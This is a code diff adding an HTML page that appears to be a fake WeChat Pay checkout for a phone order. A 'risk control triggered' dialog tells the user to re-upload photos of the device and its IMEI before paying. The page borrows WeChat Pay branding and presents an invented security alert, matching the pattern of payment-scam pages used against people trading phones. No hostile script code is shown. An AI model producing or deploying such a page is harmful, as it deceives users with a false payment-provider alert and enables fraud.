@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#24c6a4">
+  <title>订单支付 · 收款风控核验</title>
+  <link rel="stylesheet" href="assets/styles.css">
+</head>
+<body class="pay-page">
+  <div class="pay-shell">
+    <header class="pay-top">
+      <button class="icon-btn" type="button" aria-label="返回订单">
+        <span data-icon="arrow-left"></span>
+      </button>
+      <div class="pay-heading">
+        <span>SECURE CHECKOUT</span>
+        <h1>订单支付</h1>
+      </div>
+      <button class="icon-btn" type="button" aria-label="支付帮助" id="helpButton">?</button>
+    </header>
+
+    <main class="pay-content">
+      <section class="pay-risk-banner" aria-label="风险核验提示">
+        <span class="banner-icon" data-icon="shield-lock"></span>
+        <div class="banner-copy">
+          <strong>支付前需完成安全核验</strong>
+          <span>该订单已触发整体风控，资料需重新上传</span>
+        </div>
+        <button type="button" data-open-risk>去核验</button>
+      </section>
+
+      <section class="pay-card" aria-labelledby="paymentTitle">
+        <div class="merchant-row">
+          <div class="merchant-mark" aria-hidden="true">云</div>
+          <div class="merchant-info">
+            <p>收款方</p>
+            <p id="paymentTitle">云帆数码旗舰店</p>
+          </div>
+          <span class="status-chip">待支付</span>
+        </div>
+
+        <div class="order-line">
+          <span>订单号</span>
+          <span class="order-code">TCB2026110949852</span>
+        </div>
+
+        <div class="qr-stage">
+          <div class="pay-brand">
+            <span class="wechat-mark" aria-hidden="true"><span>✓</span></span>
+            <div>微信支付 <small>WECHAT PAY</small></div>
+          </div>
+          <div class="qr-frame" aria-label="微信支付二维码示意图">
+            <div class="qr-grid" id="paymentQr" aria-hidden="true"></div>
+            <div class="qr-logo" aria-hidden="true">✓</div>
+          </div>
+          <p class="scan-hint">请使用微信扫一扫完成支付</p>
+        </div>
+
+        <div class="receipt-cut" aria-hidden="true"></div>
+
+        <div class="amount-block">
+          <span class="amount-label">支付金额</span>
+          <div class="amount-value" aria-label="支付金额 1683 元"><small>¥</small>1,683.00</div>
+        </div>
+
+        <p class="pay-secure-note">
+          <span data-icon="shield-check"></span>
+          微信支付提供资金安全保障
+        </p>
+      </section>
+
+      <div class="pay-links">
+        <button class="coupon-row" type="button">重新选择优惠 <span data-icon="chevron-right"></span></button>
+        <button class="support-pill" type="button">
+          <span data-icon="headset"></span>
+          在线客服
+        </button>
+      </div>
+    </main>
+
+    <footer class="pay-footer">订单支付服务由微信支付提供技术支持</footer>
+  </div>
+
+  <dialog class="risk-dialog" id="riskDialog" aria-labelledby="riskDialogTitle" aria-describedby="riskDialogLead">
+    <div class="risk-sheet">
+      <div class="sheet-handle" aria-hidden="true"></div>
+      <button class="dialog-close" type="button" data-close-risk aria-label="关闭弹窗">
+        <span data-icon="x"></span>
+      </button>
+
+      <div class="risk-symbol" aria-hidden="true">
+        <span data-icon="shield-alert"></span>
+      </div>
+
+      <div class="risk-tag-row">
+        <span class="risk-chip">整体风控已触发</span>
+        <span class="risk-case-id">RC-20261109-0521</span>
+      </div>
+
+      <h2 id="riskDialogTitle">这两张图片需要重新上传</h2>
+      <p class="risk-lead" id="riskDialogLead">
+        系统检测到本笔交易存在异常。为保障资金安全，请重新上传本机图片和 IMEI 示例图，提交后将进入人工审核。
+      </p>
+
+      <div class="evidence-requirements" aria-label="需要重新上传的资料">
+        <article class="evidence-requirement">
+          <div class="mini-photo">
+            <img src="assets/device-evidence.svg" alt="本机照片示例">
+            <span>01</span>
+          </div>
+          <div>
+            <h3>本机图片</h3>
+            <p>手机正面完整入镜，屏幕保持点亮</p>
+          </div>
+        </article>
+        <article class="evidence-requirement">
+          <div class="mini-photo">
+            <img src="assets/imei-evidence.svg" alt="IMEI 图片示例">
+            <span>02</span>
+          </div>
+          <div>
+            <h3>IMEI 图片</h3>
+            <p>IMEI 号段清晰完整，不要遮挡或反光</p>
+          </div>
+        </article>
+      </div>
+
+      <div class="review-expectation">
+        <span data-icon="clock"></span>
+        提交后进入人工审核，预计 <strong>10 分钟内</strong>完成
+      </div>
+
+      <div class="risk-actions">
+        <a class="btn btn-primary" href="upload.html">
+          <span data-icon="upload"></span>
+          重新上传资料
+        </a>
+        <button class="btn btn-secondary" type="button" data-close-risk>暂不支付</button>
+      </div>
+
+      <p class="risk-privacy">资料仅用于本次交易安全核验，不会用于其他用途。请确保照片由你本人拍摄。</p>
+    </div>
+  </dialog>
+
+  <script src="assets/icons.js"></script>
+  <script src="assets/store.js"></script>
+  <script src="assets/payment.js"></script>
+</body>
+</html>
